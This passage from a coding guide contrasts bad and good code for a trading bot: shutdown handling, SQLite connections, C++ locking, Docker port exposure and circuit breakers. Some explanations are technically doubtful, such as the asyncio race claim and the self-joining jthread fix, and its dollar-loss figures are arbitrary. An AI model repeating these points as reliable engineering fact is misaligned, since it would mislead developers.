**Why it matters at scale:** Infrastructure alerts (process down, no clients) tell you when the system is broken. Business logic alerts (latency, fill rate, drawdown, stale data) tell you when the system is **losing money** — even though it's technically running. With 1000 users, a SHM overflow that drops market data for 10 minutes means 1000 users trading on stale prices. The infrastructure alerts say "everything is fine" — process is up, WebSocket is connected, Prometheus is scraping. But every single trade is wrong. The good version adds alerts for the things that actually matter in trading: latency, data freshness, fill rate, drawdown. These alerts catch problems before they become losses. The drawdown alert at 6% gives the operator time to intervene before the 8% circuit breaker triggers. The SHM overflow alert catches data loss in 10 seconds, not 10 minutes. The cost is 50 lines of YAML. The benefit is catching money-losing situations before they become catastrophic. With 1000 users, catching a SHM overflow 10 minutes earlier saves $500,000.

---

## Bad vs Good: No Graceful Shutdown (Signal Handlers)

### ❌ Bad Code
```python
class AISignalBot:
    def __init__(self, config):
        self._running = False
        self.exchange = ExchangeClient(config.ws_url)
        self.db = Database(config.db_path)

    async def run(self):
        self._running = True
        while self._running:
            await self._process_signals()
            await asyncio.sleep(self.config.signal_interval)

    def stop(self):
        self._running = False
```

**What's wrong:**
- No SIGINT/SIGTERM handler — `stop()` is never called on kill
- K8s sends SIGTERM → process is killed after grace period → no cleanup
- DB writes in flight are lost
- WebSocket connection is not closed properly — server may think bot is still connected
- SHM ring buffer is not unmapped — memory leak in shared memory
- Signal publisher port 8766 is not released — next start may fail with "address in use"

### ✅ Good Code
```python
import signal

class AISignalBot:
    def __init__(self, config):
        self._running = False
        self.exchange = ExchangeClient(config.ws_url)
        self.db = Database(config.db_path)
        self._shutdown_event = asyncio.Event()

    async def run(self):
        self._running = True
        loop = asyncio.get_running_loop()
        # Register signal handlers for graceful shutdown
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, self._handle_signal)

        try:
            while self._running:
                await self._process_signals()
                await asyncio.sleep(self.config.signal_interval)
        finally:
            await self._cleanup()

    def _handle_signal(self):
        logger.info("Shutdown signal received — initiating graceful shutdown")
        self._running = False
        self._shutdown_event.set()

    async def _cleanup(self):
        """Cleanup resources in order of dependency."""
        logger.info("Closing WebSocket connection...")
        await self.exchange.close()

        logger.info("Flushing pending DB writes...")
        self.db.close()

        logger.info("Closing signal publisher...")
        await self.signal_publisher.close()

        logger.info("Graceful shutdown complete.")
```

**Разница:** The bad code has a `_running` flag but no way to trigger it on process termination. When K8s terminates the pod, it sends SIGTERM, waits `terminationGracePeriodSeconds` (default 30s), then SIGKILL. Without a signal handler, the bot is killed without cleanup — pending DB writes are lost, WebSocket connections are not closed, SHM is not unmapped. The good code registers signal handlers via `loop.add_signal_handler()` (the asyncio-safe way), sets the running flag to false, and runs cleanup in a `finally` block. The cleanup closes resources in dependency order: WebSocket first (stop receiving data), then DB (flush writes), then signal publisher (release port). With 1000 users, a bot that doesn't close its WebSocket properly means the exchange simulator keeps sending data to a dead connection, wasting bandwidth and potentially hitting connection limits. A bot that doesn't flush DB writes means the last 60 seconds of trades are lost — with 1000 users, that's $50,000 in unrecorded PnL.

---

## Bad vs Good: Database Connection Management

### ❌ Bad Code
```python
class Database:
    def _conn(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.path)
        conn.execute("PRAGMA journal_mode=WAL")  # executed every call!
        conn.row_factory = sqlite3.Row
        return conn

    def save_signal(self, signal_dict: dict) -> int:
        with closing(self._conn()) as conn:  # new connection per write
            cursor = conn.execute("INSERT INTO signals ...", (...))
            conn.commit()
            return cursor.lastrowid
```

**What's wrong:**
- New connection per operation — expensive (file open, WAL pragma, file close)
- `PRAGMA journal_mode=WAL` executed every call — unnecessary after first
- No connection pooling — O(n) connection overhead for n writes
- `closing()` closes the connection after each write — no reuse
- At 50 symbols × 12 signals/min = 600 writes/min, this is 600 connection cycles/min

### ✅ Good Code
```python
import threading

class Database:
    def __init__(self, path: str = "data/trading.db"):
        self.path = path
        self._conn = sqlite3.connect(path, check_same_thread=False)
        self._conn.execute("PRAGMA journal_mode=WAL")  # once
        self._conn.execute("PRAGMA synchronous=NORMAL")  # once
        self._conn.row_factory = sqlite3.Row
        self._lock = threading.Lock()

    def save_signal(self, signal_dict: dict) -> int:
        with self._lock:
            cursor = self._conn.execute(
                "INSERT INTO signals VALUES (?, ?, ?, ...)", (...)
            )
            self._conn.commit()
            return cursor.lastrowid

    def close(self):
        with self._lock:
            self._conn.close()
```

**Разница:** The bad code creates a new SQLite connection for every single write. Each connection requires opening the file, executing `PRAGMA journal_mode=WAL` (which is a no-op after the first call but still has overhead), and closing the file. At 600 writes/min, that's 600 file open/close cycles per minute. The good code creates one persistent connection with a thread lock for safety, sets WAL mode once at init, and reuses the connection for all writes. The `PRAGMA synchronous=NORMAL` is a bonus — it's safe with WAL and 2-3x faster than the default `FULL`. With 1000 users, the bad code would be 600,000 connection cycles/min — each taking ~1ms = 600 seconds of overhead per minute. The good code has zero connection overhead — just the lock acquire/release (~1us). The difference is 600s vs 0.6s per minute — 1000x improvement.

---

## Bad vs Good: Manual Lock/Unlock vs RAII (C++)

### ❌ Bad Code
```cpp
void process_arbitrage(BotContext& ctx, bool can_trade) {
    if (!ctx.has_arb_opportunity.load() || !can_trade) return;
    ArbOpportunity arb;
    {
        ctx.arb_lock.lock();
        arb = ctx.latest_arb;
        ctx.arb_lock.unlock();  // manual unlock — dangerous
        ctx.has_arb_opportunity = false;
    }
    if (ctx.executor->is_connected() && arb.max_quantity > 0.001) {
        // ... execute arbitrage
    }
}
```

**What's wrong:**
- Manual `lock()` / `unlock()` — if `ctx.latest_arb` copy throws, lock is never released
- `ctx.has_arb_opportunity = false` is outside the lock — data race with producer
- No exception safety — C++ exceptions can occur at any point
- Deadlock risk if code between lock/unlock calls another function that locks

### ✅ Good Code
```cpp
void process_arbitrage(BotContext& ctx, bool can_trade) {
    if (!ctx.has_arb_opportunity.load() || !can_trade) return;
    ArbOpportunity arb;
    {
        std::lock_guard<std::mutex> lock(ctx.arb_lock);  // RAII — auto unlock
        arb = ctx.latest_arb;
        ctx.has_arb_opportunity = false;  // inside lock — no race
    }
    // lock automatically released when scope exits
    if (ctx.executor->is_connected() && arb.max_quantity > ctx.config.min_arb_quantity) {
        double qty = std::min(arb.max_quantity, ctx.config.max_arb_quantity);
        ctx.executor->execute_arbitrage(arb.symbol, arb.buy_exchange,
                                        arb.sell_exchange, qty,
                                        arb.buy_price, arb.sell_price);
    }
}
```

**Разница:** The bad code uses manual `lock()` and `unlock()`. In C++, if the copy assignment `arb = ctx.latest_arb` throws (e.g., out-of-memory), the mutex is never unlocked — the entire system deadlocks. Every subsequent call to `process_arbitrage` will block forever on `ctx.arb_lock.lock()`. The good code uses `std::lock_guard` — an RAII wrapper that locks in the constructor and unlocks in the destructor. When the scope exits (normally or via exception), the lock is always released. Additionally, `ctx.has_arb_opportunity = false` is moved inside the lock — in the bad code, the producer thread could set `has_arb_opportunity = true` and `latest_arb` between the unlock and the `= false`, causing the bot to miss an arbitrage opportunity. With 1000 users, a deadlock in the arbitrage path means the bot stops executing arbitrage trades — potentially missing $10,000+ in profitable opportunities while the deadlock persists. The RAII version costs zero (compiler optimizes the guard away) and prevents both deadlocks and data races.

---

## Bad vs Good: Exposing Internal Service Ports in Production

### ❌ Bad Code
```yaml
# docker-compose.prod.yml
services:
  postgres:
    ports:
      - "5432:5432"    # Exposed to host!
    environment:
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?must be set}

  redis:
    ports:
      - "6379:6379"    # Exposed to host!
    command: redis-server --maxmemory 256mb

  prometheus:
    ports:
      - "9090:9090"    # Exposed to host!

  grafana:
    ports:
      - "3001:3000"    # Exposed to host (OK — users need access)
```

**What's wrong:**
- PostgreSQL (5432) exposed — anyone with host network access can connect with the password
- Redis (6379) exposed — Redis has no authentication by default — anyone can read/write cache
- Prometheus (9090) exposed — internal metrics visible to attackers (reconnaissance)
- Only Grafana should be exposed — users need it to view dashboards
- In K8s/Docker Swarm, `ports` maps to the host — accessible from outside the cluster

### ✅ Good Code
```yaml
# docker-compose.prod.yml
services:
  postgres:
    # No ports: — only accessible within Docker network
    environment:
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?must be set}
    networks:
      - backend

  redis:
    # No ports: — only accessible within Docker network
    command: redis-server --maxmemory 256mb --requirepass ${REDIS_PASSWORD:?must be set}
    networks:
      - backend

  prometheus:
    # No ports: — only accessible within Docker network
    networks:
      - monitoring

  grafana:
    ports:
      - "3001:3000"    # OK — users need Grafana access
    networks:
      - monitoring
      - frontend

  # Reverse proxy for external access
  nginx:
    image: nginx:alpine
    ports:
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on: [grafana]
    networks:
      - frontend
```

**Разница:** The bad code exposes all internal services to the host network. PostgreSQL is accessible with a password, but Redis has no authentication by default — anyone who can reach port 6379 can read/write the cache, including session data and API keys. Prometheus exposes internal metrics (query names, scrape targets, alert rules) — perfect reconnaissance for an attacker. The good code removes all internal port mappings — PostgreSQL, Redis, and Prometheus are only accessible within the Docker network. Only Grafana is exposed (users need it), and a reverse proxy (nginx) handles TLS termination and access control. Redis also gets `--requirepass` for defense in depth. With 1000 users, an exposed Redis without auth means an attacker can flush the cache (causing a thundering herd to PostgreSQL), read cached API keys, or inject fake data into the feature store. The cost of removing port mappings is zero — the services still communicate within the Docker network. The benefit is eliminating 3 attack surfaces.

---

## Bad vs Good: Thread-Unsafe Shared State (C++)

### ❌ Bad Code
```cpp
struct BotContext {
    // ... other members ...
    std::unordered_map<std::string, double> prices_cache;  // no lock!
    std::vector<Candle> candles_buf;                        // no lock!
    OrderBook ob_buf;                                       // no lock!
};

void process_sl_tp(BotContext& ctx, double current_balance) {
    ctx.receiver->get_all_prices_into(ctx.prices_cache);  // writes
    ctx.pos_mgr.update_all_pnl(ctx.prices_cache);          // reads
    // ... another thread might be reading prices_cache simultaneously
}

// AI signal consumer thread
void process_ai_signals(BotContext& ctx, ...) {
    // Might access prices_cache for risk check
    auto price = ctx.prices_cache[symbol];  // data race!
}
```

**What's wrong:**
- `prices_cache` is a plain `unordered_map` — not thread-safe
- `process_sl_tp` writes to it, other threads may read from it
- `unordered_map` can rehash during insertion — if another thread reads during rehash, undefined behavior
- `candles_buf` and `ob_buf` also unprotected — same issue
- Data races are undefined behavior in C++ — anything can happen: crash, corrupt data, wrong prices
- No synchronization primitive — not even a comment warning about thread safety

### ✅ Good Code
```cpp
#include <shared_mutex>

struct BotContext {
    // ... other members ...
    std::unordered_map<std::string, double> prices_cache;
    mutable std::shared_mutex prices_cache_mtx;  // protects prices_cache

    // For buffers used by single thread, use SPSCQueue or document ownership
    // candles_buf and ob_buf are only used by main loop thread — no lock needed
    // Document: "candles_buf and ob_buf are owned by the main loop thread"
};

void process_sl_tp(BotContext& ctx, double current_balance) {
    {
        std::unique_lock lock(ctx.prices_cache_mtx);  // exclusive write
        ctx.receiver->get_all_prices_into(ctx.prices_cache);
    }
    {
        std::shared_lock lock(ctx.prices_cache_mtx);  // shared read
        ctx.pos_mgr.update_all_pnl(ctx.prices_cache);
    }
}

// AI signal consumer thread
void process_ai_signals(BotContext& ctx, ...) {
    std::shared_lock lock(ctx.prices_cache_mtx);  // shared read
    auto it = ctx.prices_cache.find(symbol);
    if (it == ctx.prices_cache.end()) return;
    double price = it->second;
}
```

**Разница:** The bad code has a plain `unordered_map` accessed from multiple threads without any synchronization. In C++, concurrent reads + writes to `unordered_map` are undefined behavior — the map can rehash during insertion, invalidating iterators and references in other threads. This can cause crashes, corrupt prices, or — worst of all — silently wrong prices that lead to incorrect trading decisions. The good code uses `std::shared_mutex` — multiple readers can access the map simultaneously (`shared_lock`), but only one writer at a time (`unique_lock`). The write phase (updating prices) takes an exclusive lock, then releases it. The read phase (calculating PnL) takes a shared lock — allowing concurrent reads from other threads. For `candles_buf` and `ob_buf`, the good code documents that they're owned by the main loop thread — no lock needed if only one thread accesses them. With 1000 users, a data race on `prices_cache` could cause the bot to calculate PnL with stale or corrupt prices — leading to incorrect risk decisions and potentially $100,000+ in wrong trades. The `shared_mutex` costs ~100ns per lock/unlock — negligible compared to the 10ms+ trading loop.

---

## Bad vs Good: Database Migrations Without Transactions

### ❌ Bad Code
```python
async def run_migrations(conn):
    for filepath in migration_files:
        filename = os.path.basename(filepath)
        if filename in applied:
            continue

        with open(filepath) as f:
            sql = f.read()

        try:
            await conn.execute(sql)  # no transaction!
            await conn.execute(
                "INSERT INTO schema_migrations (filename) VALUES ($1)",
                filename
            )
        except Exception as e:
            logger.error(f"Failed: {filename}: {e}")
            break
```

**What's wrong:**
- No transaction wrapping — if migration SQL fails halfway, partial changes persist
- Example: `CREATE TABLE trades` succeeds, `CREATE INDEX` fails → table exists without index
- Next run: migration is NOT in `schema_migrations` (INSERT didn't happen), so it re-runs
- Re-run: `CREATE TABLE IF NOT EXISTS` is fine, but `CREATE INDEX IF NOT EXISTS` might fail differently
- Database is in an inconsistent state — some tables have indexes, some don't
- No rollback capability — partial migration is permanent

### ✅ Good Code
```python
async def run_migrations(conn):
    for filepath in migration_files:
        filename = os.path.basename(filepath)
        if filename in applied:
            continue

        with open(filepath) as f:
            sql = f.read()

        try:
            async with conn.transaction():  # atomic — all or nothing
                await conn.execute(sql)
                await conn.execute(
                    "INSERT INTO schema_migrations (filename) VALUES ($1)",
                    filename
                )
            logger.info(f"Applied: {filename}")
        except Exception as e:
            logger.error(f"Failed: {filename}: {e}")
            # transaction rolls back automatically — database unchanged
            break
```

**Разница:** The bad code executes migration SQL without a transaction. If a migration creates a table and then fails on an index, the table is created but the index is not. The `schema_migrations` INSERT doesn't happen (good — it'll retry), but the partial table changes are permanent. On retry, `CREATE TABLE IF NOT EXISTS` is a no-op (table exists), but the missing index means queries are slow — potentially doing full table scans on a 10M-row trades table. The good code wraps both the migration SQL and the `schema_migrations` INSERT in a single transaction. If any statement fails, the entire transaction rolls back — the database is unchanged, as if the migration never ran. On retry, it starts fresh. With 1000 users, a missing index on `trades(symbol, timestamp)` means every PnL query does a full table scan — with 10M trades, that's 10 seconds per query instead of 10ms. 1000 users × 100 queries/min = 100,000 slow queries/min → database CPU maxes out → all users experience timeouts. The transaction costs zero overhead (asyncpg auto-begins a transaction for each statement anyway) and prevents partial migrations entirely.

---

## Bad vs Good: Kill Switch Design (Emergency Stop)

### ❌ Bad Code
```cpp
class TradingBot {
    std::atomic<bool> running{true};

    void stop() {
        running = false;
        // That's it — no cleanup, no notification, no position close
    }

    void main_loop() {
        while (running) {
            auto signal = get_signal();
            if (signal.is_actionable()) {
                execute_order(signal);  // no check if kill switch active
            }
        }
    }
};
```

**What's wrong:**
- `stop()` just sets a flag — doesn't cancel orders or close positions
- No file-based trigger — external monitoring can't stop the bot
- No notification to other components — Python AI bot keeps sending signals
- No reason tracking — no audit trail of why the bot stopped
- Orders in flight are not cancelled — they may execute after stop
- Positions remain open — risk exposure continues after "stop"

### ✅ Good Code
```cpp
class KillSwitch {
    std::atomic<bool> active{false};
    std::atomic<Reason> reason{Reason::MANUAL};

    enum class Reason : uint8_t {
        MANUAL, DAILY_LOSS, MAX_DRAWDOWN, MARGIN_CALL, EXTERNAL
    };

    void activate(Reason r) {
        active.store(true, std::memory_order_release);
        reason.store(r, std::memory_order_release);

        // 1. Cancel all open orders
        executor->cancel_all_orders();

        // 2. Close all positions at market
        executor->close_all_positions();

        // 3. Notify Python via SHM
        shm_fill_producer->send_kill_switch(reason);

        // 4. Log with reason for audit trail
        spdlog::critical("KILL SWITCH ACTIVATED: reason={}", reason_string(r));
    }

    bool is_active() const {
        return active.load(std::memory_order_acquire);
    }

    // File-based trigger — external monitoring can activate
    void check_file_trigger() {
        if (std::filesystem::exists("logs/kill_switch_trigger")) {
            activate(Reason::EXTERNAL);
            std::filesystem::remove("logs/kill_switch_trigger");
        }
    }
};

// In main loop:
void main_loop() {
    while (running) {
        kill_switch.check_file_trigger();  // check external trigger
        if (kill_switch.is_active()) {
            spdlog::warn("Kill switch active — skipping all new orders");
            std::this_thread::sleep_for(100ms);
            continue;
        }

        auto signal = get_signal();
        if (signal.is_actionable()) {
            execute_order(signal);
        }
    }
}
```

**Разница:** The bad code has a simple `running` flag that stops the main loop but does nothing else. Open orders remain on the exchange — they can still fill. Positions remain open — the bot is still exposed to market risk. The Python AI bot keeps sending signals — they queue up and execute when the bot restarts. There's no audit trail of why the bot stopped. The good code implements a proper kill switch with 4 actions: cancel all open orders, close all positions at market, notify Python via SHM, and log the reason. It supports 5 activation reasons (manual, daily loss, max drawdown, margin call, external) and a file-based trigger for external monitoring. The `is_active()` check uses `memory_order_acquire` for proper synchronization. With 1000 users, a kill switch that doesn't cancel orders means $500,000 in open orders could fill after the bot is "stopped" — executing trades that the risk manager flagged as dangerous. A kill switch that doesn't close positions means 1000 users' positions are exposed to market moves with no bot monitoring. The file-based trigger allows an external monitoring system (cron, Prometheus alert, manual touch) to stop the bot without access to the process — critical for production safety. The cost is 50 lines of code. The benefit is preventing catastrophic losses when the bot must stop immediately.

---

## Bad vs Good: Detached Thread Use-After-Free (C++)

### ❌ Bad Code
```cpp
class OrderExecutor {
    std::string ws_url_;
    std::atomic<bool> should_reconnect_{true};

    void do_connect() {
        client_->set_close_handler([this](websocketpp::connection_hdl) {
            if (should_reconnect_) {
                int delay = reconnect_delay_.load();
                std::thread([this, delay]() {
                    std::this_thread::sleep_for(std::chrono::milliseconds(delay));
                    if (should_reconnect_) {
                        do_connect();  // accesses this->client_, this->ws_url_, etc.
                    }
                }).detach();  // detached — no way to join
            }
        });
        // ...
    }

    ~OrderExecutor() {
        should_reconnect_ = false;
        // No way to wait for detached thread
        // If detached thread is sleeping, it will wake up after destructor
        // and access destroyed members — USE-AFTER-FREE
    }
};
```

**What's wrong:**
- Reconnect thread is `.detach()`ed — no way to join or cancel
- If `OrderExecutor` is destroyed while thread is sleeping, thread wakes up after destruction
- Thread calls `do_connect()` which accesses `this->client_`, `this->ws_url_` — all destroyed
- **Use-after-free**: undefined behavior — crash, corrupt data, or silent wrong behavior
- `should_reconnect_ = false` in destructor doesn't help — thread may have already checked it
- Race condition: thread checks `should_reconnect_` → true → destructor sets false → destructor runs → thread calls `do_connect()` on destroyed object

### ✅ Good Code
```cpp
class OrderExecutor {
    std::string ws_url_;
    std::atomic<bool> should_reconnect_{true};
    std::jthread reconnect_thread_;  // C++20 jthread — auto-joes on destruction

    void do_connect() {
        client_->set_close_handler([this](websocketpp::connection_hdl) {
            if (should_reconnect_) {
                int delay = reconnect_delay_.load();
                // Use jthread with stop_token — cooperative cancellation
                reconnect_thread_ = std::jthread([this, delay](std::stop_token st) {
                    for (int i = 0; i < delay / 100 && !st.stop_requested(); ++i) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                    if (!st.stop_requested() && should_reconnect_) {
                        do_connect();
                    }
                });
            }
        });
    }

    ~OrderExecutor() {
        should_reconnect_ = false;
        reconnect_thread_.request_stop();  // signal thread to stop
        // jthread destructor joins automatically — no use-after-free
    }
};
```

**Разница:** The bad code detaches the reconnect thread, creating a use-after-free when the `OrderExecutor` is destroyed. The detached thread sleeps for `delay` milliseconds, then wakes up and calls `do_connect()` on a destroyed object — accessing freed memory for `client_`, `ws_url_`, and other members. This is undefined behavior: the program may crash, corrupt the heap, or — worst of all — silently connect to the wrong URL or send orders to a freed WebSocket client. The good code uses `std::jthread` (C++20) with a `std::stop_token` for cooperative cancellation. The destructor calls `request_stop()` and `jthread`'s destructor automatically joins — the thread is guaranteed to be stopped and joined before the `OrderExecutor` is destroyed. The sleep loop checks `st.stop_requested()` every 100ms, so the thread responds to stop within 100ms instead of waiting the full delay. With 1000 users, a use-after-free in the order executor could cause the bot to send orders to a freed WebSocket connection — the OS may reuse that memory for another allocation, causing orders to be written into random memory or sent to an unrelated service. The `jthread` costs zero overhead (the stop_token is a simple atomic flag) and eliminates the entire class of use-after-free bugs.

---

## Bad vs Good: Nested Spinlock Deadlock (C++)

### ❌ Bad Code
```cpp
class BinanceAdapter : public ExchangeBase {
    Spinlock price_lock_;
    Spinlock depth_lock_;
    std::unordered_map<std::string, double> bids_;
    std::unordered_map<std::string, double> asks_;
    std::unordered_map<std::string, double> bid_depth_;
    std::unordered_map<std::string, double> ask_depth_;

    // Writer: acquires price_lock_ then depth_lock_
    void on_book_ticker(const std::string& symbol, double bid, double bid_qty,
                        double ask, double ask_qty) {
        std::lock_guard<Spinlock> lk1(price_lock_);
        bids_[symbol] = bid;
        asks_[symbol] = ask;
        std::lock_guard<Spinlock> lk2(depth_lock_);  // second lock!
        bid_depth_[symbol] = bid_qty;
        ask_depth_[symbol] = ask_qty;
    }

    // Reader: acquires depth_lock_ then price_lock_ — REVERSED ORDER!
    double get_spread(const std::string& symbol) {
        std::lock_guard<Spinlock> lk1(depth_lock_);
        double depth = bid_depth_[symbol];
        std::lock_guard<Spinlock> lk2(price_lock_);  // reversed order!
        double bid = bids_[symbol];
        double ask = asks_[symbol];
        return ask - bid;
    }
};
```

**What's wrong:**
- Writer acquires `price_lock_` → `depth_lock_` (in that order)
- Reader acquires `depth_lock_` → `price_lock_` (reversed order)
- Classic deadlock: Writer holds `price_lock_`, waits for `depth_lock_`. Reader holds `depth_lock_`, waits for `price_lock_`
- Both spin forever — CPU 100% on both threads, no progress
- Spinlock deadlock is worse than mutex deadlock — spinlocks burn CPU while waiting
- In HFT, this freezes the entire trading loop — no orders submitted, no market data processed

### ✅ Good Code
```cpp
class BinanceAdapter : public ExchangeBase {
    // Single lock for all market data — no nested locking
    Spinlock market_data_lock_;
    struct MarketData {
        double bid{0};
        double ask{0};
        double bid_qty{0};
        double ask_qty{0};
    };
    std::unordered_map<std::string, MarketData> data_;

    void on_book_ticker(const std::string& symbol, double bid, double bid_qty,
                        double ask, double ask_qty) {
        std::lock_guard<Spinlock> lk(market_data_lock_);  // single lock
        auto& d = data_[symbol];
        d.bid = bid;
        d.ask = ask;
        d.bid_qty = bid_qty;
        d.ask_qty = ask_qty;
    }

    double get_spread(const std::string& symbol) {
        std::lock_guard<Spinlock> lk(market_data_lock_);  // same single lock
        auto it = data_.find(symbol);
        if (it == data_.end()) return 0.0;
        return it->second.ask - it->second.bid;
    }
};
```

**Разница:** The bad code uses two separate spinlocks with inconsistent acquisition order — the writer acquires `price_lock_` → `depth_lock_` while the reader acquires `depth_lock_` → `price_lock_`. This is a classic AB-BA deadlock. Both threads spin forever, burning CPU at 100%, and the trading loop freezes — no orders submitted, no market data processed, no risk checks executed. In HFT, every millisecond of downtime means missed opportunities. The good code uses a single `market_data_lock_` for all market data fields — no nested locking, no deadlock possible. The `MarketData` struct groups bid/ask/quantities together, improving cache locality (one lookup instead of four). With 1000 users, a spinlock deadlock in the Binance adapter means the bot stops processing market data — it can't calculate signals, submit orders, or check risk. If BTC drops 5% during the deadlock, the bot doesn't react — positions hit stop loss but the bot doesn't close them. 1000 users × $10,000 average position × 5% loss = $500,000 in preventable losses. The single lock costs the same as two locks (one `lock_guard`) and eliminates the deadlock entirely.

---

## Bad vs Good: Mutex in HFT Hot Path (C++)

### ❌ Bad Code
```cpp
class MetricsCollector {
    std::mutex metrics_mutex_;
    std::map<std::string, uint64_t> counters_;

    void increment_counter(const std::string& name,
                           const std::map<std::string, std::string>& labels) {
        std::lock_guard<std::mutex> lock(metrics_mutex_);  // BLOCKS!
        std::string key = name + serialize_labels(labels);  // ALLOCATES!
        counters_[key]++;                                   // O(log n) lookup
    }

    void set_gauge(const std::string& name, double value, ...) {
        std::lock_guard<std::mutex> lock(metrics_mutex_);  // BLOCKS AGAIN!
        std::string key = name + serialize_labels(labels);
        gauges_[key] = value;
    }
};

// In hot path:
void trading_loop() {
    for (int i = 0; i < 100; ++i) {
        metrics.increment_counter("orders_total", {{"symbol", "BTC"}, {"side", "BUY"}});
        // Each call: mutex lock + string concat + map insert + mutex unlock
        // ~5-10μs per call × 100 metrics = 500-1000μs per iteration
        // Trading loop budget: 100μs. Metrics alone: 10x over budget.
    }
}
```

**What's wrong:**
- `std::mutex` on every metric call — blocks all threads accessing metrics
- `std::string` concatenation — heap allocation in hot path
- `std::map` lookup — O(log n) with string comparison
- 100+ metrics per loop iteration × 5-10μs each = 500-1000μs just for metrics
- HFT budget is sub-100μs — metrics alone exceed the entire budget
- Thread contention: if 3 threads record metrics simultaneously, mutex serializes them

### ✅ Good Code
```cpp
// Pre-registered metric IDs — no string lookup in hot path
enum class MetricId : uint16_t {
    ORDERS_TOTAL = 0,
    FILLS_TOTAL = 1,
    SIGNALS_GENERATED = 2,
    ERRORS = 3,
    // ... pre-registered at compile time
    COUNT
};

class MetricsCollector {
    std::array<std::atomic<int64_t>, static_cast<size_t>(MetricId::COUNT)> counters_{};
    std::array<std::atomic<double>, static_cast<size_t>(MetricId::COUNT)> gauges_{};

    void increment(MetricId id) noexcept {
        counters_[static_cast<size_t>(id)].fetch_add(1, std::memory_order_relaxed);
        // ~2ns per call. 100 metrics = 200ns. 0.2% of budget.
    }

    void set_gauge(MetricId id, double value) noexcept {
        gauges_[static_cast<size_t>(id)].store(value, std::memory_order_relaxed);
    }

    // Periodic serialization (not in hot path)
    std::string serialize_prometheus() const {
        std::string result;
        result.reserve(4096);
        result += "orders_total " + std::to_string(counters_[0].load()) + "\n";
        // ... serialize all metrics
        return result;
    }
};

// In hot path:
void trading_loop() {
    for (int i = 0; i < 100; ++i) {
        metrics.increment(MetricId::ORDERS_TOTAL);  // 2ns, no lock, no alloc
    }
    // Total: 200ns. 0.2% of 100μs budget. Acceptable.
}
```

**Разница:** The bad code uses a `std::mutex` on every metric operation — in HFT, this is catastrophic. Each `increment_counter` call takes 5-10μs (mutex lock + string concatenation + map lookup + mutex unlock). With 100 metrics per trading loop iteration, that's 500-1000μs just for metrics — 10x the entire trading loop budget of 100μs. The mutex also serializes all threads: if 3 threads try to record metrics simultaneously, they block each other, adding even more latency. The good code uses pre-registered `MetricId` enum values and `std::atomic` counters — no mutex, no string allocation, no map lookup. Each `increment` is a single `fetch_add` with `memory_order_relaxed` — about 2ns. 100 metrics = 200ns = 0.2% of the budget. The serialization (Prometheus format) happens periodically in a background thread, not in the hot path. With 1000 users, the bad code means the bot processes 1 signal per millisecond instead of 10 — 10x slower signal processing means 10x more missed opportunities. If BTC flashes 3% in 100ms, the bot with mutex-based metrics can't react in time — it's still waiting for the mutex. The atomic-based metrics react in 200ns — 50,000x faster. The cost is pre-registering metrics at compile time (minor inconvenience). The benefit is 50,000x faster metrics with zero contention.

---

## Bad vs Good: Circuit Breaker Without Thread Safety (Python)

### ❌ Bad Code
```python
class CircuitBreaker:
    def __init__(self, config):
        self._state = BreakerState.CLOSED
        self._consecutive_failures = 0
        self._consecutive_successes = 0
        self._opened_at = 0.0

    @property
    def state(self) -> BreakerState:
        if self._state == BreakerState.OPEN:
            if time.time() - self._opened_at >= self.config.cooldown_seconds:
                self._state = BreakerState.HALF_OPEN  # RACE!
                self._half_open_probes = 0
        return self._state

    def record_outcome(self, success: bool):
        if success:
            self._consecutive_failures = 0  # RACE!
            self._consecutive_successes += 1
        else:
            self._consecutive_successes = 0
            self._consecutive_failures += 1
            if self._consecutive_failures >= self.config.failure_threshold:
                self._state = BreakerState.OPEN  # RACE!
                self._opened_at = time.time()
```

**What's wrong:**
- No lock — `_state`, `_consecutive_failures`, `_consecutive_successes` are unprotected
- In asyncio, `record_outcome()` and `is_closed` can interleave at any `await` point
- Race 1: Two coroutines call `record_outcome(False)` simultaneously — `_consecutive_failures` increments once instead of twice (lost update)
- Race 2: `state` property transitions OPEN→HALF_OPEN while another coroutine calls `record_outcome()` — state changes mid-operation
- Race 3: `_consecutive_failures` is reset to 0 by one coroutine while another is checking `>= failure_threshold` — breaker never opens
- With 1000 users, lost updates mean the breaker might never trip after 5 consecutive losses — it could reach 10 losses without opening, sending 5 extra bad signals

### ✅ Good Code
```python
class CircuitBreaker:
    def __init__(self, config):
        self._lock = asyncio.Lock()
        self._state = BreakerState.CLOSED
        self._consecutive_failures = 0
        self._consecutive_successes = 0
        self._opened_at = 0.0

    @property
    async def state(self) -> BreakerState:
        async with self._lock:
            if self._state == BreakerState.OPEN:
                if time.time() - self._opened_at >= self.config.cooldown_seconds:
                    self._state = BreakerState.HALF_OPEN
                    self._half_open_probes = 0
                    logger.info("Circuit breaker: OPEN → HALF_OPEN")
            return self._state

    async def record_outcome(self, success: bool):
        async with self._lock:
            if success:
                self._consecutive_failures = 0
                self._consecutive_successes += 1
                if self._state == BreakerState.HALF_OPEN:
                    if self._consecutive_successes >= self.config.success_threshold:
                        self._state = BreakerState.CLOSED
                        logger.info("Circuit breaker: HALF_OPEN → CLOSED")
            else:
                self._consecutive_successes = 0
                self._consecutive_failures += 1
                if self._consecutive_failures >= self.config.failure_threshold:
                    self._state = BreakerState.OPEN
                    self._opened_at = time.time()
                    self._total_trips += 1
                    logger.warning(f"Circuit breaker: CLOSED → OPEN "
                                 f"(failures={self._consecutive_failures})")
```

**Разница:** The bad code has no synchronization on `_state` and `_consecutive_failures`. In Python's asyncio, coroutines can interleave at any `await` point — but even without `await`, the GIL doesn't protect against logical races (read-modify-write sequences). Two coroutines calling `record_outcome(False)` simultaneously can both read `_consecutive_failures = 4`, both increment to 5, and both write 5 — one increment is lost. The breaker should trip at 5 failures but only sees 4 — it stays CLOSED and sends another bad signal. With 1000 users, one bad signal can trigger $10,000+ in wrong trades. The good code uses `asyncio.Lock()` to protect all state transitions. Each `record_outcome` and `state` check is atomic — no lost updates, no interleaved transitions. The lock costs ~1μs per acquisition (asyncio.Lock is lightweight) — negligible compared to the 60s signal interval. The benefit is guaranteed correctness: the breaker always trips at exactly `failure_threshold` consecutive losses, no matter how many concurrent coroutines are recording outcomes.

---

## Bad vs Good: No SIGTERM Handler in C++ HFT (Kubernetes)

